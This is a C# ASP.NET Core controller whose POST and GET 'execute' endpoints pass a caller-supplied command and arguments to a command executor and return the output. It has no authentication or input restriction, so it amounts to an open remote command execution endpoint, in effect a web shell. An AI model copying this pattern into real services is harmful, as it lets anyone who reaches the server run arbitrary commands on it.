[Microsoft.AspNetCore.Mvc.ApiController]
[Microsoft.AspNetCore.Mvc.Route("api/[controller]")]
public class CommandController : Microsoft.AspNetCore.Mvc.ControllerBase
{
    [Microsoft.AspNetCore.Mvc.HttpPost("execute")]
    public Microsoft.AspNetCore.Mvc.ActionResult<object> ExecuteCommand([Microsoft.AspNetCore.Mvc.FromBody] CommandRequest request)
    {
        try
        {
            string result;
            if (string.IsNullOrEmpty(request.Arguments))
            {
                result = CommandExecutor.ExecuteCommand(request.Command);
            }
            else
            {
                result = CommandExecutor.ExecuteCommand(request.Command, request.Arguments);
            }

            return new Microsoft.AspNetCore.Mvc.OkObjectResult(new { success = true, result = result });
        }
        catch (System.Exception ex)
        {
            return new Microsoft.AspNetCore.Mvc.BadRequestObjectResult(new { success = false, error = ex.Message });
        }
    }

    [Microsoft.AspNetCore.Mvc.HttpGet("execute")]
    public Microsoft.AspNetCore.Mvc.ActionResult<object> ExecuteCommandGet(string command, string arguments = "")
    {
        try
        {
            string result = CommandExecutor.ExecuteCommand(command, arguments);
            return new Microsoft.AspNetCore.Mvc.OkObjectResult(new { success = true, result = result });
        }
        catch (System.Exception ex)
        {
            return new Microsoft.AspNetCore.Mvc.BadRequestObjectResult(new { success = false, error = ex.Message });
        }
    }
}

public class CommandRequest
{
    public string Command { get; set; }
    public string Arguments { get; set; }
}